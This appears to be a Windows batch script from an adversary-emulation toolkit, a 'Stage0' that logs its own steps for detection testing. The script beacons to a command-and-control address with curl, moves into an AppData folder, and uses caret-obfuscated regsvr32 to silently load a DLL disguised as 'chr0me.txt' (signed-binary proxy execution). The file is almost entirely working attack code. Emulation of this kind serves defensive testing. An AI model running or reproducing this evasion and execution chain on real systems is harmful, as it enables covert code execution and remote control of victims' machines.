@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET aqjkl=%APPDATA%\8925\b4f58985
SET hkncr=Macula-Stage0-8925
SET qwert=https://10.0.0.49
SET yuiop=https://10.0.0.49/stage/2/icon.png?8925-7
SET asdfg=BALAM-S2BO
SET zxcvb=7
SET mnbvc=chr0me.txt
SET lkjhg=8925

SET logp=%APPDATA%\!zxcvb!\macula-simulations.log
SET agentvar=!asdfg!
echo [%DATE% %TIME%][DEBUG][!agentvar!]: simulation_init>> "!logp!" 2>nul

REM Initial delay
echo [%DATE% %TIME%][DEBUG][!agentvar!]: delay_start>> "!logp!" 2>nul
timeout /t 12 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!agentvar!]: delay_end>> "!logp!" 2>nul

REM C2 heartbeat (no obfuscation)
echo [%DATE% %TIME%][DEBUG][!agentvar!]: heartbeat_start>> "!logp!" 2>nul
curl -k -s -o nul "!yuiop!"
echo [%DATE% %TIME%][DEBUG][!agentvar!]: heartbeat_end>> "!logp!" 2>nul

ping -n 8 127.0.0.1 >nul

REM Change directory
echo [%DATE% %TIME%][DEBUG][!agentvar!]: chdir_start>> "!logp!" 2>nul
cd /d "!aqjkl!" >nul 2>&1
echo [%DATE% %TIME%][DEBUG][!agentvar!]: chdir_end=!cd!>> "!logp!" 2>nul

SET /A delay=%RANDOM% %% 15 + 10
timeout /t %delay% /nobreak >nul

REM Obfuscated Regsvr32 execution
echo [%DATE% %TIME%][DEBUG][!agentvar!]: dll_load_start>> "!logp!" 2>nul
SET b1=r^e^g
SET b2=s^v^r
SET b3=3^2^.^e^x^e
SET b4= /s
SET result=1
SET err=

!b1!!b2!!b3!!b4! "!mnbvc!" >nul 2>&1
IF !ERRORLEVEL! NEQ 0 (
    SET result=0
    SET err=load_failed_!ERRORLEVEL!
)
echo [%DATE% %TIME%][DEBUG][!agentvar!]: dll_load_end>> "!logp!" 2>nul

REM TTP logging
SET dt=%DATE:~-4%-%DATE:~-7,2%-%DATE:~-10,2% %TIME%
echo [!dt!][!agentvar!]: !zxcvb!-!lkjhg!-T1218|SignedBinaryProxyExecution=!result!:!err!>> "!logp!" 2>nul

CHOICE /C Y /N /D Y /T 5 >nul
ENDLOCAL